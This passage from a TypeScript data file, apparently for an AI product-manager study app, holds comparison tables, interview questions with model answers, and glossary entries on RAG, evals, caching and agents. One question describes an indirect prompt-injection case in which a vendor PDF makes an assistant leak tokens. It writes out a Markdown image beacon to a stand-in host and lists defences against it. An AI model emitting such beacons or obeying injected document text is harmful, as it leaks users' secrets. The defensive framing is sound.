        'Hybrid RAG + Reranker',
        'Q&A, policy auditing, support copilots needing fresh cited facts',
        '1.2s–3.5s · Medium',
        'Stale index, bad chunking, missing ACL pre-filters, ungrounded extrapolation',
      ],
      [
        'Rung 5',
        'Bounded Workflow + Scoped Agent',
        'Multi-system research, branching tool execution, code fixes with checks',
        '5s–60s+ · High',
        'Compounding step error (p^N), infinite loops, unsafe irreversible writes',
      ],
    ],
  },
  {
    id: 'metrics-hierarchy',
    title: 'The AI PM Metrics Hierarchy',
    subtitle: 'Connect offline eval quality to online user trust and P&L sustainability.',
    takeaway:
      'High "thumbs up" vanity metrics hide massive friction. Track implicit Edit Distance, Accept Rate, and P95 Cohort Gross Margin alongside offline Golden Eval pass rates.',
    headers: ['Layer', 'Core Metrics', 'How Measured', 'PM Action Trigger'],
    rows: [
      [
        '1. Business & Retention',
        'Time-to-Value, Task Completion Lift, D30 Retained AI Active Seats, Net Revenue Retention',
        'Product analytics + A/B holdouts',
        'If engagement drops after week 2, feature is novelty not workflow value',
      ],
      [
        '2. Implicit UX Trust',
        'Unchanged Accept Rate, Edit Distance / Rewrite Ratio, Regeneration Rate, Citation Click Rate',
        'Frontend diff & interaction telemetry',
        'High edit distance -> promote edited traces to Golden Eval & improve few-shot examples',
      ],
      [
        '3. Offline & Online Evals',
        'Stratified Golden Pass %, Faithfulness, Recall@K, Adversarial Pass (100%), Judge TPR/TNR',
        'CI eval runner + weekly SME audits',
        'Block deploys on safety regressions; hill-climb weakest failure slice',
      ],
      [
        '4. System & Unit Economics',
        'TTFT (P50/P95), End-to-End Latency, Cost/Task, Prefix Cache Hit %, P95 Cohort Gross Margin',
        'OpenTelemetry GenAI spans + billing logs',
        'If P95 margin < 55%, add fast-model routing, semantic cache, or distillation',
      ],
    ],
  },
  {
    id: 'context-vs-rag-vs-finetune',
    title: 'Prompting vs. RAG vs. Fine-Tuning (SFT / DPO) Matrix',
    subtitle: 'Solve the right problem with the right lever instead of jumping prematurely to expensive training.',
    takeaway:
      'Fine-tuning teaches style, format, and domain judgment at lower cost/latency—it is terrible for injecting rapidly changing facts. Use RAG for knowledge and SFT/DPO for distilled behavior.',
    headers: ['Lever', 'What It Fixes Best', 'What It Fails At', 'Data & Maintenance Cost', 'When to Choose'],
    rows: [
      [
        'Prompt & Context Engineering',
        'Task rules, XML boundaries, tone, JSON schemas, few-shot edge cases',
        'Huge dynamic knowledge bases (>100k docs); tiny latency budgets',
        'Very low (hours)',
        'Always start here first! Solves 70% of 0-to-1 issues',
      ],
      [
        'Hybrid RAG + Memory',
        'Mutable private knowledge, citations, tenant ACLs, user preferences',
        'Fixing deep multi-step reasoning flaws or complex output style',
        'Medium (ingestion & chunking pipeline)',
        'Whenever answers depend on fresh, proprietary, or verifiable documents',
      ],
      [
        'Supervised Fine-Tuning (SFT)',
        'Strict domain syntax, compact prompts, distilling Frontier -> Fast 8B model',
        'Memorizing live inventory, prices, or daily policy updates',
        'High (2k–10k clean golden pairs + eval harness)',
        'Once task hits >500k–1M calls/mo and you need 4x speed / 10x lower COGS',
      ],
      [
        'Preference Alignment (DPO)',
        'Nuanced edge-case judgment, reducing false positives/refusals',
        'Teaching brand-new knowledge unseen during pretraining',
        'High (paired chosen vs. rejected user-edit traces)',
        'After SFT when human editors consistently prefer subtle tradeoffs',
      ],
    ],
  },
  {
    id: 'latency-cost-stack',
    title: 'The 6-Layer Inference Cost & Latency Optimization Stack',
    subtitle: 'Ship sub-second UX and 75%+ gross margins without downgrading complex reasoning quality.',
    takeaway:
      'Stacking tiered model routing + prefix caching + concise structured outputs typically cuts inference spend by 70–85% while reducing TTFT by 3x.',
    headers: ['Optimization Layer', 'Mechanism', 'Typical Savings', 'PM Risk / Gotcha to Watch'],
    rows: [
      [
        '1. Semantic / Exact Cache',
        'Serve identical or 0.96+ similar queries in ~20ms at $0 inference',
        '20–45% volume offloaded',
        'MUST partition cache keys by tenant_id and user ACLs!',
      ],
      [
        '2. Tiered Intent Router',
        'Route 70% simple requests to Fast/Small model; escalate hard 30% to Frontier',
        '50–70% cost cut; 2.5x faster P50',
        'Monitor misrouted escalations on boundary eval slices',
      ],
      [
        '3. Prefix KV Caching',
        'Keep static system prompt, tools, and few-shots identical at start of prompt',
        '50–90% off cached input tokens',
        'Putting timestamps or user IDs at the top of prompt busts the entire cache!',
      ],
      [
        '4. Output & Thinking Trim',
        'Constrain JSON fields, eliminate verbose prose, cap reasoning effort on simple turns',
        '30–60% decode cost & latency cut',
        'Output tokens cost 3x–5x input; trim fluff ruthlessly',
      ],
      [
        '5. Streaming & Optimistic UI',
        'Stream partial tokens or progressive skeleton cards immediately at TTFT',
        'Perceived wait drops 40–60%',
        'Validate partial JSON gracefully before rendering UI actions',
      ],
      [
        '6. Teacher-Student Distillation',
        'Train small fast student model on 5k verified frontier teacher production traces',
        '80–90% cost cut at scale',
        'Requires locked Golden Eval suite to prove parity before cutover',
      ],
    ],
  },
  {
    id: 'reasoning-vs-standard-matrix',
    title: 'Standard LLM vs. Reasoning Model (Test-Time Compute) Matrix',
    subtitle: 'Pick `reasoning_effort` intentionally based on task verifiability, tolerance for wait time, and hidden output-token cost.',
    takeaway:
      'Use a fast cascade intent router so 70%+ of routine requests stay sub-second on System-1 models, reserving System-2 thinking tokens for complex reconciliation, multi-file diffs, and math.',
    headers: ['Tier', 'Latency / TTFT', 'Hidden Output Multiplier', 'Best Product Jobs', 'PM Anti-Pattern'],
    rows: [
      ['Fast-Mini (System-1)', '< 600ms', '1x (no hidden reasoning)', 'Intent routing, extraction, triage, streaming copilot UX', 'Complex multi-hop legal/code reconciliation'],
      ['Balanced Frontier (System-1)', '600ms – 1.4s', '1x', 'Grounded RAG Q&A, PRD synthesis, nuanced voice/chat', 'Burning cost on high-volume binary classification'],
      ['Reasoning-Low (Test-Time)', '1.5s – 4.5s', '2x – 4x hidden CoT', 'Schema-strict multi-constraint analysis, moderate SQL', 'Leaving silent spinner with no progress step hint'],
      ['Reasoning-High (Test-Time)', '6s – 25s', '5x – 12x hidden CoT', 'Multi-file code refactoring, compliance audit, deep debugging', 'Making every user chat greeting wait 12s & pay 10x output'],
    ],
  },
  {
    id: 'multi-agent-topology-matrix',
    title: 'Single-Agent vs. Orchestrator-Worker vs. State-Graph Matrix',
    subtitle: 'Start with the simplest deterministic state machine before escalating to parallel or handoff agents.',
    takeaway:
      'Passing full parent chat transcripts across agents explodes token costs quadratically; always pass typed JSON handoff schemas and isolate write permissions.',
    headers: ['Topology', 'Control Pattern', 'Strength', 'Primary Failure Mode'],
    rows: [
      ['Single Agent + Bounded Tools', '1 LLM iteratively selects from <= 8 tools', 'Fastest to debug, clean trace tree, lowest overhead', 'Tool selection confusion when > 15 tools overlap'],
      ['Deterministic DAG / State Graph', 'App code controls transitions; LLM fills bounded nodes', 'Highest reliability (`p` reset at every deterministic edge)', 'Rigid when handling unpredictable open-ended tasks'],
      ['Orchestrator + Parallel Read Workers', 'Lead decomposes goal into independent read workers in parallel', 'Wall-clock latency stays flat (`max` not `sum`); clean context isolation', 'Token explosion without `max_workers` and timeout caps'],
      ['Conversational Handoff Swarm', 'Triage agent routes session to domain specialist agent', 'Domain-focused instructions & tools for support/sales desks', 'Infinite handoff ping-pong without explicit handoff limits'],
    ],
  },
];

export const INTERVIEW_QUESTIONS: InterviewQuestion[] = [
  {
    id: 'iq-ux-1',
    category: 'Product Sense & AI UX',
    difficulty: 'L5 Senior PM',
    question:
      'Your enterprise CRM team wants to replace its global search & workflow bar with an AI Chat Sidebar. Why might that fail, and what would you design instead?',
    whatInterviewersLookFor:
      'Awareness of the "blank prompt box" problem, high interaction cost of typing prompts vs. inline workflow affordances, verification speed, and trust calibration.',
    commonTrap:
      'Saying "Yes, chat is great—we will add suggested starter prompts and fine-tune GPT" without questioning whether chat is the wrong UX pattern.',
    staffAnswerBlueprint: [
      'Diagnose why generic chatboxes underperform in high-frequency SaaS: users suffer blank-page paralysis, must context-switch out of their record, and waste time prompting.',
      'Segment jobs-to-be-done: (a) deterministic navigation stays instant keyword/filter UI; (b) inline drafting/summarization becomes contextual 1-click actions or ghost suggestions inside the record; (c) multi-record research stays in an async Artifact Canvas.',
      'Design trust & recovery: show clickable source citations for every CRM claim, preview destructive updates in a visual diff card with 1-click Undo, and log Accept/Edit/Reject telemetry.',
      'Define success metrics beyond chat usage: reduction in time-to-complete account prep, Unchanged Accept Rate, and D30 retained workflow adoption.',
    ],
  },
  {
    id: 'iq-ux-2',
    category: 'Product Sense & AI UX',
    difficulty: 'L6 Staff PM',
    question:
      'How do you design UX for an AI coding or document assistant when model accuracy is 88% today and latency is 4.5 seconds?',
    whatInterviewersLookFor:
      'Designing around probabilistic failure (the 12% error budget) and latency physics rather than pretending the AI is 100% accurate or instant.',
    commonTrap:
      'Claiming "We will optimize prompts until accuracy hits 99.9%"—which ignores inherent stochastic uncertainty.',
    staffAnswerBlueprint: [
      'Separate high-cost vs. low-cost errors: auto-apply only low-blast-radius reversible drafts; gate schema edits or external writes behind human diff review.',
      'Attack perceived latency: move 4.5s work off the typing thread into async side-cards or streaming progress indicators showing intermediate verified steps.',
      'Build explicit abstention & confidence states: train/prompt the model to surface uncertainty highlights or ask 1 targeted clarifying question instead of hallucinating.',
      'Optimize Time-to-Verify: format output as scannable diffs or cited bullets so spotting the 12% errors takes 5 seconds instead of 5 minutes.',
    ],
  },
  {
    id: 'iq-ux-3',
    category: 'Product Sense & AI UX',
    difficulty: 'L5 Senior PM',
    question:
      'Design a realtime multimodal voice AI agent for drive-thru or clinic intake where background noise and interruptions are constant.',
    whatInterviewersLookFor:
      'Deep grasp of Voice Activity Detection (VAD), barge-in handling, latency budgets (<500ms turn-to-turn), and graceful deterministic handoffs.',
    commonTrap:
      'Treating voice as "Whisper -> LLM -> ElevenLabs" without addressing 2.5s walkie-talkie lag, crosstalk, or noisy entity confirmation (names/dosages).',
    staffAnswerBlueprint: [
      'Choose architecture intentionally: Native Speech-to-Speech when conversational prosody & <400ms turn latency matter; Cascaded pipeline when strict policy/tool determinism is paramount (with streaming STT + sentence-chunked TTS).',
      'Design acoustic resilience: tune semantic endpointing (distinguish "uhh..." thinking pauses from completed turns), enable instant barge-in audio buffer clearing, and echo cancellation.',
      'Handle high-stakes slots visually or via confirmation: repeat back phone numbers, SKUs, or medical allergies concisely and escalate after 2 failed ASR turns.',
      'Instrument audio-specific evals: Word Error Rate (WER) under 70dB noise, False-Interruption Rate, and P95 turn-to-turn latency.',
    ],
  },
  {
    id: 'iq-tech-1',
    category: 'Technical Architecture (RAG, Evals & Agents)',
    difficulty: 'L6 Staff PM',
    question:
      'Users complain your enterprise RAG copilot is "hallucinating wrong answers" on internal policy docs. How do you systematically diagnose and fix it?',
    whatInterviewersLookFor:
      'Ability to decompose RAG failures cleanly into Chunking, ACLs, Retrieval (Recall@K), Reranking, and Generation Faithfulness rather than blindly tweaking the prompt.',
    commonTrap:
      'Immediately saying "Let us switch to a larger model or fine-tune on our company docs."',
    staffAnswerBlueprint: [
      'Split telemetry & evals into Retrieval vs. Generation: pull 50 failed traces and check whether the ground-truth doc ever entered the Top-K context window.',
      'Check common retrieval traps: naive fixed-char chunking splitting tables/headers (fix with Markdown structure + breadcrumb headers), dense-only embeddings missing exact codes/acronyms (add BM25 hybrid + RRF), and stale archive docs outranking 2026 addendums (add recency filtering + cross-encoder reranker).',
      'Audit security & abstention: verify tenant/user ACL pre-filtering BEFORE vector ranking, and add explicit NO_EVIDENCE abstention rules when top reranker score falls below threshold.',
      'Verify with two separate metrics in CI: Retrieval Recall@8 and Grounded Faithfulness.',
    ],
  },
  {
    id: 'iq-tech-2',
    category: 'Technical Architecture (RAG, Evals & Agents)',
    difficulty: 'L6 Staff PM',
    question:
      'Walk me through how you would build an Evals-Driven Development (EDD) release gate for an AI customer support refund agent.',
    whatInterviewersLookFor:
      'Stratified golden datasets, Tier-1 deterministic code assertions, binary calibrated LLM-as-a-Judge (TPR/TNR), and zero-tolerance safety gates.',
    commonTrap:
      'Relying on a 1–5 "helpfulness score" from an uncalibrated LLM judge or averaging across easy and critical safety test cases.',
    staffAnswerBlueprint: [
      'Build a stratified Golden Dataset (150+ cases) weighted across routine approvals, nuanced partial-return exceptions, missing-receipt abstentions, and adversarial prompt injections.',
      'Layer Tier-1 deterministic code graders first: valid JSON schema, calculated refund <= paid amount, order status check.',
      'Layer Tier-2 binary PASS/FAIL LLM judges per atomic rubric, calibrated against 60 SME-labeled traces until Judge TPR & TNR both exceed 88%.',
      'Enforce stratified CI release gates: block any deploy if Adversarial/Cap Safety < 100%, even if aggregate accuracy jumped from 89% to 94%.',
    ],
  },
  {
    id: 'iq-tech-3',
    category: 'Technical Architecture (RAG, Evals & Agents)',
    difficulty: 'Principal / AI Lead',
    question:
      'We want to automate a 12-step financial reconciliation workflow with an autonomous multi-agent system. What makes it fail in production and how do you architect reliability?',
    whatInterviewersLookFor:
      'Mastery of the Compounding Error Law (p^N), collapsing deterministic transitions into code, idempotency keys, MCP tool contracts, and risk-based HITL checkpoints.',
    commonTrap:
      'Designing a "Planner Agent, Worker Agent, Reviewer Agent" swarm chatting back and forth without bounding steps, blast radius, or deterministic invariants.',
    staffAnswerBlueprint: [
      'Frame the Compounding Error Law: at 94% step accuracy over 12 open-loop steps, end-to-end reliability collapses to 0.94^12 = 47.6%—unacceptable for finance.',
      'Shift predictable steps to deterministic code: keep schema parsing, balance checks, and API pagination in a deterministic workflow state machine; invoke LLM reasoning only on messy invoice matching.',
      'Harden MCP tools: return corrective validation hints, enforce idempotency keys on all writes, cap step/retry budgets, and isolate read vs. irreversible write tools.',
      'Place HITL checkpoints on high-dollar variances or low-confidence matches via a visual diff card, aiming for >99% Safe Outcome Rate (autonomous success OR clean escalation).',
    ],
  },
  {
    id: 'iq-metrics-1',
    category: 'Metrics, Experimentation & Execution',
    difficulty: 'L5 Senior PM',
    question:
      'How do you A/B test a new AI prompt/model upgrade when traditional p-value clicks are noisy and model responses are stochastic?',
    whatInterviewersLookFor:
      'Understanding of offline eval gating before online canary, paired/interleaved evaluation or cluster randomization, guardrail metrics, and Edit Distance telemetry.',
    commonTrap:
      'Shipping directly to a 50/50 user A/B test without offline regression checks or monitoring P95 latency and COGS per conversion.',
    staffAnswerBlueprint: [
      'Gate offline first: candidate build must pass Golden Eval suite (quality, safety, cost ceiling) and run in Shadow Mode on mirrored production traffic to catch unseen distribution shifts.',
      'Run online canary (1% -> 5% -> 25%) checking hard system guardrails: P95 TTFT, error/timeout rate, and token COGS/session.',
      'Measure behavior, not vanity clicks: primary online metrics are Unchanged Accept Rate, Edit Distance, Retry/Abandon Rate, and downstream task completion.',
      'Run paired SME blind review on diverging A vs. B traces if online metrics move ambiguously.',
    ],
  },
  {
    id: 'iq-metrics-2',
    category: 'Metrics, Experimentation & Execution',
    difficulty: 'L6 Staff PM',
    question:
      'Engineering says "We have 50 different prompt bugs and hallucination edge cases—how should we prioritize our AI roadmap for the next 6 weeks?"',
    whatInterviewersLookFor:
      'AI execution rituals (weekly trace triage, open-coding failure taxonomy, Pareto clustering) and hill-climbing discipline rather than ad-hoc prompt whack-a-mole.',
    commonTrap:
      'Prioritizing whichever stakeholder screamed loudest or rewriting prompts manually for individual bug tickets without regression tests.',
    staffAnswerBlueprint: [
      'Run structured Error Analysis on 50–100 high-friction production traces (high edits, retries, downvotes) and tag every failure by pipeline stage (Retrieval, Chunking, Reasoning, Format, Latency).',
      'Apply Pareto prioritization: quantify frequency x business severity—usually 1–2 systemic root causes (e.g., missing BM25 or missing abstention rule) explain 65%+ of failures.',
      'Establish a hill-climbing loop: lock the bug clusters into the Golden Eval set first, then let engineering iterate rapidly against measurable slice scores.',
      'Balance short-term prompt/retrieval fixes with longer-term structural wins (prefix caching, distillation, UX affordances).',
    ],
  },
  {
    id: 'iq-metrics-3',
    category: 'Metrics, Experimentation & Execution',
    difficulty: 'L5 Senior PM',
    question:
      'Our AI summary feature has an 82% thumbs-up rate, yet overall workspace retention did not move. Why, and what metrics were we missing?',
    whatInterviewersLookFor:
      'Recognizing courtesy/selection bias in thumbs-up buttons, measuring counterfactual workflow value, and connecting AI outputs to downstream actions.',
    commonTrap:
      'Assuming 82% thumbs-up means high PMF and recommending more marketing banners.',
    staffAnswerBlueprint: [
      'Expose the vanity metric trap: <3% of users click thumbs-up/down, creating extreme selection bias while silent churners simply abandon the pane.',
      'Audit true engagement depth: check % of eligible workflows invoking AI, Unchanged Accept Rate, Edit Distance, and copy/export actions into downstream work.',
      'Diagnose value vs. novelty: if users read summaries once out of curiosity but still manually read the full source doc because they do not trust omissions, AI added latency rather than saving time.',
      'Fix by embedding clickable section citations, tuning conciseness to user workflow, and measuring time-saved + D30 retention cohort lift.',
    ],
  },
  {
    id: 'iq-strat-1',
    category: 'Strategy, Moats & Pricing',
    difficulty: 'L6 Staff PM',
    question:
      'Every quarter, frontier labs release cheaper, smarter models that obsolete thin AI startups. How do you build a durable AI product moat?',
    whatInterviewersLookFor:
      'Clear distinction between commoditizing foundation weights vs. proprietary context graphs, embedded workflow lock-in, implicit edit telemetry, and domain eval datasets.',
    commonTrap:
      'Saying "Our prompt engineering is secret IP" or "We fine-tuned Llama once" without explaining compounding loops.',
    staffAnswerBlueprint: [
      'Acknowledge that model intelligence and raw wrapper UIs are rapidly commoditizing; you should benefit from foundation upgrades ("model-agnostic routing") rather than competing with OpenAI/Anthropic.',
      'Build Moat Pillar 1 — System-of-Record Context Graph: integrate deeply into multi-system permissions, entity schemas, and live customer state no standalone chatbot sees.',
      'Build Moat Pillar 2 — Proprietary Telemetry & Eval Flywheel: capture every accept, edit diff, and override to curate domain-specific Golden Evals and DPO preference pairs.',
      'Build Moat Pillar 3 — Embedded Workflow & Auditability: become the compliant system of action with SSO, ACLs, HITL approval workflows, and enterprise audit trails.',
    ],
  },
  {
    id: 'iq-strat-2',
    category: 'Strategy, Moats & Pricing',
    difficulty: 'Principal / AI Lead',
    question:
      'Our $39/seat "Unlimited AI" add-on is seeing 90% margin erosion among our top 10% power-user accounts. How do you fix pricing and architecture without sparking customer backlash?',
    whatInterviewersLookFor:
      'Combining unit-economics architecture (routing + prefix caching + distillation) with predictable hybrid packaging (seat + credit pool or outcome tiers).',
    commonTrap:
      'Either abruptly cutting off power users mid-month OR blindly hiking everyone’s seat price by 3x.',
    staffAnswerBlueprint: [
      'Fix inference COGS under the hood first: run the P95 cohort numbers—introduce tiered routing (70% fast small model), turn off hidden reasoning tokens on simple tasks, and fix prompt ordering for 80%+ KV prefix caching.',
      'Redesign packaging around Hybrid Seat + Included Workflow Credit Pools: price Predictable Base Seat + generous included monthly AI runs (covering 90% of users seamlessly).',
      'Handle the top 10% power users cleanly: offer clear usage visibility, optional add-on credit packs for high-ROI bulk automation, or automatic graceful step-down to Fast tier beyond included quota.',
      'Communicate upgrade around business outcomes delivered (hours saved / tickets resolved) rather than exposing raw tokens to buyers.',
    ],
  },
  {
    id: 'iq-strat-3',
    category: 'Strategy, Moats & Pricing',
    difficulty: 'L6 Staff PM',
    question:
      'A Fortune 100 bank wants to buy your AI platform, but their CISO blocks the deal over hallucination liability and data leakage fears. How do you unblock them?',
    whatInterviewersLookFor:
      'Enterprise AI readiness fluency: Zero Data Retention (ZDR), tenant ACL enforcement, indirect prompt injection defenses, auditability, and risk-scoped rollout.',
    commonTrap:
      'Saying "SOC2 Type II covers it" without addressing LLM-specific risks like provider training retention, indirect injection, and RBAC bypass in RAG.',
    staffAnswerBlueprint: [
      'Resolve data governance upfront: provide contractual Zero Data Retention (ZDR), zero foundation-model training guarantees, regional EU/US residency, and PII pre-redaction.',
      'Prove retrieval & agent isolation: demonstrate mandatory pre-retrieval RBAC/ACL filtering in vector/BM25 search and XML control-plane separation against indirect prompt injection.',
      'Derisk hallucination liability via product architecture: restrict initial rollout to grounded, cited read/draft workflows with explicit abstention + mandatory human sign-off on external actions.',
      'Hand InfoSec verifiable artifacts: immutable trace audit logs, automated red-team test scores, and an instant tenant-level AI kill switch.',
    ],
  },
  {
    id: 'iq-econ-3',
    category: 'Metrics, Experimentation & Execution',
    difficulty: 'L6 Staff PM',
    question:
      'Engineering recommends upgrading your default production model to a reasoning model with `reasoning_effort: high`. Quality improves 5%, but P95 TTFT jumps to 9s and output token spend surges 8x. How do you decide and architect the solution?',
    whatInterviewersLookFor:
      'Command of System-1 vs. System-2 test-time compute economics, hidden thinking-token billing, Pareto evals, and cascade model routing.',
    commonTrap:
      'Giving a binary "yes always pick best quality" or "no reject it forever" answer without slicing traffic by task complexity.',
    staffAnswerBlueprint: [
      'Measure the 4-point Pareto Eval frontier (Fast, Frontier, Reasoning-Low, Reasoning-High) segmented by query intent slice rather than aggregate average.',
      'Prove that 70%+ of routine lookups and extractions gain ~0% from high test-time thinking tokens while suffering 9s TTFT abandonment.',
      'Design a sub-60ms Cascade Router (plus deterministic optimistic escalation when schema/validation checks fail) so only the ~15–25% multi-constraint tasks trigger reasoning compute.',
      'Pair reasoning routes with progressive streaming status steps ("Verifying clause conflicts…") and max completion caps.',
    ],
  },
  {
    id: 'iq-arch-4',
    category: 'Technical Architecture (RAG, Evals & Agents)',
    difficulty: 'Principal / AI Lead',
    question:
      'An engineering proposal introduces a 5-agent conversational swarm to research accounts and trigger billing credits. How do you review and harden this topology before approving launch?',
    whatInterviewersLookFor:
      'Understanding of compounding `p^N` failure, quadratic transcript-forwarding cost bloat, read/write privilege isolation, and partial degradation.',
    commonTrap:
      'Equating more agents with smarter architecture, or focusing only on prompt wording instead of state graphs and write gates.',
    staffAnswerBlueprint: [
      'Challenge whether a deterministic state graph or single scoped agent solves 90% of the job cheaper; justify sub-agents strictly around parallel context isolation.',
      'Ban passing raw verbose conversation histories downstream—require compact typed JSON handoff schemas with explicit `max_steps` and timeouts.',
      'Enforce strict least privilege: read-only research workers never hold billing/write tools; credit mutations execute only in a gated deterministic node with idempotency keys and HITL confirmation above dollar thresholds.',
    ],
  },
  {
    id: 'iq-ux-4',
    category: 'Product Sense & AI UX',
    difficulty: 'L5 Senior PM',
    question:
      'Pick any AI-native breakout product (e.g., Cursor, Perplexity, NotebookLM) and explain the exact product mechanism that makes it defensible beyond just wrapping a foundation LLM.',
    whatInterviewersLookFor:
      'Structured teardown ability across Workflow Wedge, Verification-Time Reduction UX, Context Graph, Implicit Telemetry, and Margin Packaging.',
    commonTrap:
      'Describing brand hype or generic prompt quality without naming architectural mechanics like shadow validation, claim provenance, or accept/edit diffs.',
    staffAnswerBlueprint: [
      'Pinpoint the specific verification bottleneck: Cursor validates code in a shadow LSP workspace before surfacing inline Tab diffs; NotebookLM constrains scope strictly to user docs with clickable anchor passages.',
      'Identify the passive telemetry flywheel capturing high-signal inline Accept/Edit/Reject events rather than noisy thumbs-up buttons.',
      'Connect packaging to COGS: e.g., Cursor hybrid seat + 500 fast requests avoids unlimited whale losses.',
    ],
  },
  {
    id: 'iq-arch-5',
    category: 'Technical Architecture (RAG, Evals & Agents)',
    difficulty: 'L6 Staff PM',
    question:
      'During red-team testing, an attacker embeds instructions inside an incoming vendor PDF causing your AI assistant to leak sensitive workspace tokens inside a rendered Markdown image tag. How do you eliminate this permanently?',
    whatInterviewersLookFor:
      'Awareness that indirect prompt injection cannot be stopped by prompt politeness alone, plus layered deterministic egress and RBAC controls.',
    commonTrap:
      'Saying "we will add DO NOT RENDER SECRET URLs to the system prompt" or running two slow 3-second safety LLMs sequentially.',
    staffAnswerBlueprint: [
      'Recognize indirect prompt injection & Markdown beacon exfiltration (`![...](https://evil.test?q=secret)`) as confused-deputy browser/egress bugs.',
      'Apply defense-in-depth at deterministic layers: wrap retrieved PDF text inside explicit `<untrusted_data>` XML boundaries, strip non-allowlisted external Markdown image/link origins in the serializer (<5ms), and lock browser CSP `img-src`.',
      'Run lightweight parallel input classifiers alongside pre-checks (<80ms overhead) and encode the exploit into the blocking CI red-team test suite.',
    ],
  },
];

export const AI_PM_GLOSSARY: GlossaryEntry[] = [
  {
    term: 'Autoregressive Next-Token Prediction',
    category: 'LLM Mechanics',
    definition:
      'The core mechanism of modern LLMs: generating one subword token at a time by sampling from a probability distribution conditioned on all preceding input and output tokens.',
    pmImplication:
      'Models do not query a truth database—they predict plausible continuations. Always pair generation with grounding and verification for factual tasks.',
  },
  {
    term: 'Temperature & Top-p (Nucleus Sampling)',
    category: 'LLM Mechanics',
    definition:
      'Decoding parameters controlling randomness during token sampling. Low temperature (0.0–0.2) sharpens toward the highest-probability tokens; higher values flatten the distribution.',
    pmImplication:
      'Set near 0 for extraction, routing, and JSON schemas; reserve 0.6–0.9 strictly for creative brainstorming or copy variation.',
  },
  {
    term: 'Structured Outputs / Constrained Decoding',
    category: 'LLM Mechanics',
    definition:
      'Inference-time token masking that guarantees model output strictly conforms to a predefined JSON Schema or grammar.',
    pmImplication:
      'Mandatory for tool calls, backend writes, and UI card rendering—eliminates 99% of syntax-parsing failures in production.',
  },
  {
    term: 'Test-Time Compute (Reasoning / Thinking Tokens)',
    category: 'LLM Mechanics',
    definition:
      'Hidden internal chain-of-thought tokens generated by reasoning models prior to emitting the final user-visible answer.',
    pmImplication:
      'Boosts accuracy on complex planning and math, but bills at expensive output rates and adds seconds to TTFT. Disable or set Low for latency-sensitive UX.',
  },
  {
    term: 'Context Rot ("Lost in the Middle")',
    category: 'LLM Mechanics',
    definition:
      'Degradation in model attention, retrieval precision, and instruction adherence as context windows fill up with noisy or weakly relevant text.',
    pmImplication:
      'A 1M-token window is NOT a dumping ground. Curate dense, reranked context chunks and isolate sub-tasks into clean sessions.',
  },
  {
    term: 'Model Snapshot Pinning',
    category: 'LLM Mechanics',
    definition:
      'Locking production API calls to an exact dated model checkpoint (e.g., `-2026-04-01`) rather than a floating `-latest` alias.',
    pmImplication:
      'Prevents silent overnight behavioral drift or broken JSON formatting when providers swap underlying weights.',
  },
  {
    term: 'TTFT (Time to First Token)',
    category: 'Economics & Latency',
    definition:
      'Elapsed time from sending the API request until the user sees the first streamed token appear, driven by network overhead, prefill length, and hidden thinking.',
    pmImplication:
      'The dominant driver of perceived responsiveness in interactive copilots and voice UIs. Prefix caching directly cuts TTFT.',
  },
  {
    term: 'TPOT (Time Per Output Token)',
    category: 'Economics & Latency',
    definition:
      'The decoding interval between successive generated tokens during streaming, typically bounded by GPU memory bandwidth.',
    pmImplication:
      'Determines total completion duration for long artifacts. Keep outputs concise and structured so users aren’t waiting 15 seconds for fluff.',
  },
  {
    term: 'Input / Output Token Asymmetry',
    category: 'Economics & Latency',
    definition:
      'Pricing reality where generated output tokens typically cost 3x to 5x more per million tokens than uncached input tokens due to sequential memory-bound decoding.',
    pmImplication:
      'Verbose AI outputs and long hidden thinking chains destroy unit economics faster than large input prompts.',
  },
  {
    term: 'KV Prefix Caching',
    category: 'Economics & Latency',
    definition:
      'Reusing precomputed transformer Key-Value attention states across requests sharing an identical static prompt prefix (often 50–90% cheaper and faster TTFT).',
    pmImplication:
      'Always structure prompts with static instructions, tools, and few-shot examples FIRST, and volatile user queries/timestamps LAST.',
  },
  {
    term: 'Semantic Caching',
    category: 'Economics & Latency',
    definition:
      'Embedding incoming user queries and returning a previously verified cached completion when cosine similarity exceeds a strict threshold (e.g., >= 0.96).',
    pmImplication:
      'Cuts COGS and latency to ~20ms on repetitive FAQs, but MUST partition cache keys by tenant_id and user ACLs to avoid data leaks.',
  },
  {
    term: 'P95 Power-User Margin Trap',
    category: 'Economics & Latency',
    definition:
      'Loss of gross margin when flat-rate "unlimited AI" pricing meets the top 5% of users generating 3x–10x median inference volume.',
    pmImplication:
      'Never model unit economics only on the average user; stress-test P95/P99 cohorts and design tiered routing + hybrid credit pools.',
  },
  {
    term: 'Evals-Driven Development (EDD)',
    category: 'Evals & Quality',
    definition:
      'Engineering discipline where every prompt, model, or retrieval change is gated automatically against a versioned Golden Dataset and calibrated scorers.',
    pmImplication:
      'The AI equivalent of TDD/CI testing—replaces subjective demo "vibe checks" with repeatable ship/no-ship rigor.',
  },
  {
    term: 'Golden Dataset',
    category: 'Evals & Quality',
    definition:
      'A curated, stratified benchmark of real and synthetic test inputs paired with reference expectations across happy paths, edge boundaries, abstentions, and adversarial traps.',
    pmImplication:
      'Owned and evolved weekly by the PM from production failures; represents one of a company’s highest-leverage internal assets.',
  },
  {
    term: 'Tier-1 Deterministic Assertions',
    category: 'Evals & Quality',
    definition:
      'Fast, zero-cost programmatic checks (JSON schema validity, regex policy IDs, arithmetic reconciliation, latency caps) run before any LLM judge.',
    pmImplication:
      'Always evaluate deterministic invariants with code first—reserve LLM judges strictly for semantic nuance.',
  },
  {
    term: 'LLM-as-a-Judge Calibration (TPR / TNR)',
    category: 'Evals & Quality',
    definition:
      'Validating an automated judge prompt against SME human labels using True Positive Rate (catching real passes) and True Negative Rate (catching real failures).',
    pmImplication:
      'An uncalibrated judge that rubber-stamps hallucinations creates false confidence. Require TPR & TNR >= 88% before using in CI gates.',
  },
  {
    term: 'Open Coding / Failure Taxonomy',
    category: 'Evals & Quality',
    definition:
      'Bottom-up qualitative labeling of 50+ failing production traces into concrete root-cause categories (Chunking, Retrieval, Abstention, Formatting, Latency).',
    pmImplication:
      'Reveals the 1–2 systemic bottlenecks driving 70% of user frustration so sprints focus on true root causes.',
  },
  {
    term: 'Shadow Mode Testing',
    category: 'Evals & Quality',
    definition:
      'Running an AI pipeline silently on mirrored live production traffic, logging predictions and eval metrics without surfacing outputs to end users.',
    pmImplication:
      'De-risks high-stakes launches by exposing real-world data messiness, latency spikes, and COGS before customers ever touch the feature.',
  },
  {
    term: 'Hybrid Search + RRF (Reciprocal Rank Fusion)',
    category: 'RAG & Context',
    definition:
      'Combining dense semantic vector search with sparse BM25 keyword search and merging ranked lists via RRF.',
    pmImplication:
